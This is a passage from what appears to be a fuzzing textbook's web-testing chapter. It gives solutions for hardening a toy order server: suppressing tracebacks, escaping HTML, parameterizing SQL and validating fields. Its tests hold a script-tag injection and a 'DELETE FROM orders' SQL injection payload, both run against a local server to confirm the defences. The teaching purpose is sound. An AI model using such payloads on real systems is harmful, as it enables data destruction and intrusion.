<h3>Exercise 1: Fix the Server<a class="headerlink" href="#exercise-1-fix-the-server" title="Link to this heading">#</a></h3>
<p>Create a <code class="docutils literal notranslate"><span class="pre">BetterHTTPRequestHandler</span></code> class that fixes the several issues of <code class="docutils literal notranslate"><span class="pre">SimpleHTTPRequestHandler</span></code>:</p>
<section id="part-1-silent-failures">
<h4>Part 1: Silent Failures<a class="headerlink" href="#part-1-silent-failures" title="Link to this heading">#</a></h4>
<p>Set up the server such that it does not reveal internal information – in particular, tracebacks and HTTP status codes.</p>
<p><strong>Solution.</strong> We define a better message that does not reveal tracebacks:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">BETTER_HTML_INTERNAL_SERVER_ERROR</span> <span class="o">=</span> \
    <span class="n">HTML_INTERNAL_SERVER_ERROR</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;&lt;pre&gt;</span><span class="si">{error_message}</span><span class="s2">&lt;/pre&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">BETTER_HTML_INTERNAL_SERVER_ERROR</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Internal Server Error</strong>
  <p>
  The server has encountered an internal error.  Go to our <a href="/">order form</a>.
  
  </p>
</div>
</body></html>
  </div></div>
</div>
<p>We have the <code class="docutils literal notranslate"><span class="pre">internal_server_error()</span></code> message return <code class="docutils literal notranslate"><span class="pre">HTTPStatus.OK</span></code> to make it harder for machines to find out something went wrong:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">BetterHTTPRequestHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">internal_server_error</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># Note: No INTERNAL_SERVER_ERROR status</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">HTTPStatus</span><span class="o">.</span><span class="n">OK</span><span class="p">,</span> <span class="s2">&quot;Internal Error&quot;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>

        <span class="n">exc</span> <span class="o">=</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exc</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">log_message</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">exc</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>

        <span class="c1"># No traceback or other information</span>
        <span class="n">message</span> <span class="o">=</span> <span class="n">BETTER_HTML_INTERNAL_SERVER_ERROR</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">))</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="part-2-sanitized-html">
<h4>Part 2: Sanitized HTML<a class="headerlink" href="#part-2-sanitized-html" title="Link to this heading">#</a></h4>
<p>Set up the server such that it is not vulnerable against HTML and JavaScript injection attacks, notably by using methods such as <code class="docutils literal notranslate"><span class="pre">html.escape()</span></code> to escape special characters when showing them.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">html</span>
</pre></div>
</div>
</div>
</div>
<p><strong>Solution.</strong> We pass all values read through <code class="docutils literal notranslate"><span class="pre">html.escape()</span></code> before showing them on the screen; this will properly encode <code class="docutils literal notranslate"><span class="pre">&lt;</span></code>, <code class="docutils literal notranslate"><span class="pre">&amp;</span></code>, and <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> characters.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">BetterHTTPRequestHandler</span><span class="p">(</span><span class="n">BetterHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">send_order_received</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">values</span><span class="p">):</span>
        <span class="n">sanitized_values</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">field</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>
            <span class="n">sanitized_values</span><span class="p">[</span><span class="n">field</span><span class="p">]</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">values</span><span class="p">[</span><span class="n">field</span><span class="p">])</span>
        <span class="n">sanitized_values</span><span class="p">[</span><span class="s2">&quot;item_name&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span>
            <span class="n">FUZZINGBOOK_SWAG</span><span class="p">[</span><span class="n">values</span><span class="p">[</span><span class="s2">&quot;item&quot;</span><span class="p">]])</span>

        <span class="n">confirmation</span> <span class="o">=</span> <span class="n">HTML_ORDER_RECEIVED</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
            <span class="o">**</span><span class="n">sanitized_values</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">HTTPStatus</span><span class="o">.</span><span class="n">OK</span><span class="p">,</span> <span class="s2">&quot;Order received&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;text/html&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">confirmation</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="part-3-sanitized-sql">
<h4>Part 3: Sanitized SQL<a class="headerlink" href="#part-3-sanitized-sql" title="Link to this heading">#</a></h4>
<p>Set up the server such that it is not vulnerable against SQL injection attacks, notably by using <em>SQL parameter substitution.</em></p>
<p><strong>Solution.</strong> We use SQL parameter substitution to avoid interpretation of inputs as SQL commands.  Also, we use <code class="docutils literal notranslate"><span class="pre">execute()</span></code> rather than <code class="docutils literal notranslate"><span class="pre">executescript()</span></code> to avoid processing of multiple commands.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">BetterHTTPRequestHandler</span><span class="p">(</span><span class="n">BetterHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">store_order</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">values</span><span class="p">):</span>
        <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">ORDERS_DB</span><span class="p">)</span>
        <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;INSERT INTO orders VALUES (?, ?, ?, ?, ?)&quot;</span><span class="p">,</span>
                <span class="p">(</span><span class="n">values</span><span class="p">[</span><span class="s1">&#39;item&#39;</span><span class="p">],</span> <span class="n">values</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="n">values</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span> <span class="n">values</span><span class="p">[</span><span class="s1">&#39;city&#39;</span><span class="p">],</span> <span class="n">values</span><span class="p">[</span><span class="s1">&#39;zip&#39;</span><span class="p">]))</span>
        <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>One could also argue not to save “dangerous” characters in the first place.  But then, there might always be names or addresses with special characters which all need to be handled.</p>
</section>
<section id="part-4-a-robust-server">
<h4>Part 4: A Robust Server<a class="headerlink" href="#part-4-a-robust-server" title="Link to this heading">#</a></h4>
<p>Set up the server such that it does not crash with invalid or missing fields.</p>
<p><strong>Solution.</strong> We set up a simple check at the beginning of <code class="docutils literal notranslate"><span class="pre">handle_order()</span></code> that checks whether all required fields are present.  If not, we return to the order form.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">BetterHTTPRequestHandler</span><span class="p">(</span><span class="n">BetterHTTPRequestHandler</span><span class="p">):</span>
    <span class="n">REQUIRED_FIELDS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;item&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="s1">&#39;city&#39;</span><span class="p">,</span> <span class="s1">&#39;zip&#39;</span><span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">handle_order</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">values</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_field_values</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">required_field</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">REQUIRED_FIELDS</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">required_field</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">send_order_form</span><span class="p">()</span>
                <span class="k">return</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">store_order</span><span class="p">(</span><span class="n">values</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_order_received</span><span class="p">(</span><span class="n">values</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<p>This could easily be extended to check for valid (at least non-empty) values.  Also, the order form should be pre-filled with the originally submitted values, and come with a helpful error message.</p>
</section>
<section id="part-5-test-it">
<h4>Part 5: Test it!<a class="headerlink" href="#part-5-test-it" title="Link to this heading">#</a></h4>
<p>Test your improved server whether your measures have been successful.</p>
<p><strong>Solution.</strong>  Here we go:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">httpd_process</span><span class="p">,</span> <span class="n">httpd_url</span> <span class="o">=</span> <span class="n">start_httpd</span><span class="p">(</span><span class="n">BetterHTTPRequestHandler</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">print_url</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre><a href="http://127.0.0.1:8800">http://127.0.0.1:8800</a></pre></div></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">print_httpd_messages</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>We test standard behavior:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">standard_order</span> <span class="o">=</span> <span class="s2">&quot;/order?item=tshirt&amp;name=Jane+Doe&amp;email=doe</span><span class="si">%40e</span><span class="s2">xample.com&amp;city=Seattle&amp;zip=98104&quot;</span>
<span class="n">contents</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">httpd_url</span> <span class="o">+</span> <span class="n">standard_order</span><span class="p">)</span>
<span class="n">HTML</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:17] "GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1" 200 -
</pre></div><div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>One FuzzingBook T-Shirt</strong> to Jane Doe in Seattle, 98104<br>
  A confirmation mail will be sent to doe@example.com.
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
</div></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">assert</span> <span class="n">contents</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;Thank you&quot;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
</pre></div>
</div>
</div>
</div>
<p>We test for incomplete URLs:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">bad_order</span> <span class="o">=</span> <span class="s2">&quot;/order?item=&quot;</span>
<span class="n">contents</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">httpd_url</span> <span class="o">+</span> <span class="n">bad_order</span><span class="p">)</span>
<span class="n">HTML</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:17] "GET /order?item= HTTP/1.1" 200 -
</pre></div><div class="output text_html">
<html><body>
<form action="/order" style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Fuzzingbook Swag Order Form</strong>
  <p>
  Yes! Please send me at your earliest convenience
  <select name="item">
  <option value="tshirt">One FuzzingBook T-Shirt</option>
<option value="drill">One FuzzingBook Rotary Hammer</option>
<option value="lockset">One FuzzingBook Lock Set</option>

  </select>
  <br>
  <table>
  <tr><td>
  <label for="name">Name: </label><input type="text" name="name">
  </td><td>
  <label for="email">Email: </label><input type="email" name="email"><br>
  </td></tr>
  <tr><td>
  <label for="city">City: </label><input type="text" name="city">
  </td><td>
  <label for="zip">ZIP Code: </label><input type="number" name="zip">
  </tr></tr>
  </table>
  <input type="checkbox" name="terms"><label for="terms">I have read
  the <a href="/terms">terms and conditions</a></label>.<br>
  <input type="submit" name="submit" value="Place order">
</p>
</form>
</body></html>
</div></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">assert</span> <span class="n">contents</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;Order Form&quot;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
</pre></div>
</div>
</div>
</div>
<p>We test for HTML (and JavaScript) injection:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">injection_order</span> <span class="o">=</span> <span class="s2">&quot;/order?item=tshirt&amp;name=Jane+Doe&quot;</span> <span class="o">+</span> <span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;&lt;script&gt;&lt;/script&gt;&quot;</span><span class="p">)</span> <span class="o">+</span> \
    <span class="s2">&quot;&amp;email=doe</span><span class="si">%40e</span><span class="s2">xample.com&amp;city=Seattle&amp;zip=98104&quot;</span>
<span class="n">contents</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">httpd_url</span> <span class="o">+</span> <span class="n">injection_order</span><span class="p">)</span>
<span class="n">HTML</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:17] "GET /order?item=tshirt&name=Jane+Doe%3Cscript%3E%3C%2Fscript%3E&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1" 200 -
</pre></div><div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>One FuzzingBook T-Shirt</strong> to Jane Doe&lt;script&gt;&lt;/script&gt; in Seattle, 98104<br>
  A confirmation mail will be sent to doe@example.com.
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
</div></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">assert</span> <span class="n">contents</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;Thank you&quot;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
<span class="k">assert</span> <span class="n">contents</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;&lt;script&gt;&quot;</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span>
<span class="k">assert</span> <span class="n">contents</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;&amp;lt;script&amp;gt;&quot;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
</pre></div>
</div>
</div>
</div>
<p>We test for SQL injection:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">sql_order</span> <span class="o">=</span> <span class="s2">&quot;/order?item=tshirt&amp;name=&quot;</span> <span class="o">+</span> \
    <span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;Robert&#39;, &#39;x&#39;, &#39;x&#39;, &#39;x&#39;); DELETE FROM orders; --&quot;</span><span class="p">)</span> <span class="o">+</span> \
    <span class="s2">&quot;&amp;email=doe</span><span class="si">%40e</span><span class="s2">xample.com&amp;city=Seattle&amp;zip=98104&quot;</span>
<span class="n">contents</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">httpd_url</span> <span class="o">+</span> <span class="n">sql_order</span><span class="p">)</span>
<span class="n">HTML</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:17] "GET /order?item=tshirt&name=Robert',+'x',+'x',+'x')%3B+DELETE+FROM+orders%3B+--&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1" 200 -
</pre></div><div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>One FuzzingBook T-Shirt</strong> to Robert&#x27;, &#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;); DELETE FROM orders; -- in Seattle, 98104<br>
  A confirmation mail will be sent to doe@example.com.
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
</div></div>
</div>
<p>(Okay, so obviously we can now handle the weirdest of names; still, Robert should consider changing his name…)</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">assert</span> <span class="n">contents</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;DELETE FROM&quot;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
<span class="k">assert</span> <span class="ow">not</span> <span class="n">orders_db_is_empty</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>That’s it – we’re done!</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">httpd_process</span><span class="o">.</span><span class="n">terminate</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">ORDERS_DB</span><span class="p">):</span>
    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">ORDERS_DB</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="exercise-2-protect-the-server">
<h3>Exercise 2: Protect the Server<a class="headerlink" href="#exercise-2-protect-the-server" title="Link to this heading">#</a></h3>
<p>Assume that it is not possible for you to alter the server code.  Create a <em>filter</em> that is run on all URLs before they are passed to the server.</p>
<section id="part-1-a-blacklisting-filter">
<h4>Part 1: A Blacklisting Filter<a class="headerlink" href="#part-1-a-blacklisting-filter" title="Link to this heading">#</a></h4>
<p>Set up a filter function <code class="docutils literal notranslate"><span class="pre">blacklist(url)</span></code> that returns <code class="docutils literal notranslate"><span class="pre">False</span></code> for URLs that should not reach the server.  Check the URL for whether it contains HTML, JavaScript, or SQL fragments.</p>
</section>
<section id="part-2-a-whitelisting-filter">
<h4>Part 2: A Whitelisting Filter<a class="headerlink" href="#part-2-a-whitelisting-filter" title="Link to this heading">#</a></h4>
<p>Set up a filter function <code class="docutils literal notranslate"><span class="pre">whitelist(url)</span></code> that returns <code class="docutils literal notranslate"><span class="pre">True</span></code> for URLs that are allowed to reach the server.  Check the URL for whether it conforms to expectations; use a <a class="reference internal" href="Parser.html"><span class="std std-doc">parser</span></a> and a dedicated grammar for this purpose.</p>
<p><strong>Solution.</strong> Left to the reader.</p>
</section>
</section>
<section id="exercise-3-input-patterns">
<h3>Exercise 3: Input Patterns<a class="headerlink" href="#exercise-3-input-patterns" title="Link to this heading">#</a></h3>
<p>To fill out forms, fuzzers could be much smarter in how they generate input values.  Starting with HTML 5, input fields can have a <code class="docutils literal notranslate"><span class="pre">pattern</span></code> attribute defining a <em>regular expression</em> that an input value has to satisfy.  A 5-digit ZIP code, for instance, could be defined by the pattern</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">pattern</span><span class="o">=</span><span class="s">&quot;[0-9][0-9][0-9][0-9][0-9]&quot;</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>Extract such patterns from the HTML page and convert them into equivalent grammar production rules, ensuring that only inputs satisfying the patterns are produced.</p>
<p><strong>Solution.</strong> Left to the reader at this point.</p>
</section>
<section id="exercise-4-coverage-driven-web-fuzzing">
<h3>Exercise 4: Coverage-Driven Web Fuzzing<a class="headerlink" href="#exercise-4-coverage-driven-web-fuzzing" title="Link to this heading">#</a></h3>
<p>Combine the above fuzzers with <a class="reference internal" href="GrammarCoverageFuzzer.html"><span class="std std-doc">coverage-driven</span></a> and <a class="reference internal" href="SearchBasedFuzzer.html"><span class="std std-doc">search-based</span></a> approaches to maximize feature and code coverage.</p>
<p><strong>Solution.</strong> Left to the reader at this point.</p>
</section>
</section>
</section>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "python"
        },
        kernelOptions: {
            name: "python3",
            path: "./."
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = 'python3'</script>

                </article>
              

              
              
              
              
                <footer class="prev-next-footer d-print-none">
                  
<div class="prev-next-area">
    <a class="left-prev"
       href="PythonFuzzer.html"
       title="previous page">
      <i class="fa-solid fa-angle-left"></i>
      <div class="prev-next-info">
        <p class="prev-next-subtitle">previous</p>
        <p class="prev-next-title">Testing Compilers</p>
      </div>
    </a>
    <a class="right-next"
       href="GUIFuzzer.html"
       title="next page">
      <div class="prev-next-info">
        <p class="prev-next-subtitle">next</p>
        <p class="prev-next-title">Testing Graphical User Interfaces</p>
      </div>
      <i class="fa-solid fa-angle-right"></i>
    </a>
</div>
                </footer>
              
            </div>
            
            
              
                <div class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">


  <div class="sidebar-secondary-item">
  <div class="page-toc tocsection onthispage">
    <i class="fa-solid fa-list"></i> Contents
  </div>
  <nav class="bd-toc-nav page-toc">
    <ul class="visible nav section-nav flex-column">
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#synopsis">Synopsis</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#fuzzing-web-forms">Fuzzing Web Forms</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#sql-injection-attacks">SQL Injection Attacks</a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#a-web-user-interface">A Web User Interface</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#excursion-implementing-a-web-server">Excursion: Implementing a Web Server</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#taking-orders">Taking Orders</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#order-confirmation">Order Confirmation</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#terms-and-conditions">Terms and Conditions</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#storing-orders">Storing Orders</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#handling-http-requests">Handling HTTP Requests</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#order-form">Order Form</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#processing-orders">Processing Orders</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#other-http-commands">Other HTTP commands</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#error-handling">Error Handling</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#page-not-found">Page Not Found</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#internal-errors">Internal Errors</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#logging">Logging</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#end-of-excursion">End of Excursion</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#running-the-server">Running the Server</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#interacting-with-the-server">Interacting with the Server</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#direct-browser-access">Direct Browser Access</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#retrieving-the-home-page">Retrieving the Home Page</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#placing-orders">Placing Orders</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#error-messages">Error Messages</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#fuzzing-input-forms">Fuzzing Input Forms</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#fuzzing-with-expected-values">Fuzzing with Expected Values</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#excursion-implementing-cgi-decode">Excursion: Implementing cgi_decode()</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id1">End of Excursion</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#fuzzing-with-unexpected-values">Fuzzing with Unexpected Values</a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#extracting-grammars-for-input-forms">Extracting Grammars for Input Forms</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#searching-html-for-input-fields">Searching HTML for Input Fields</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#mining-grammars-for-web-pages">Mining Grammars for Web Pages</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#a-fuzzer-for-web-forms">A Fuzzer for Web Forms</a></li>
</ul>
</li>
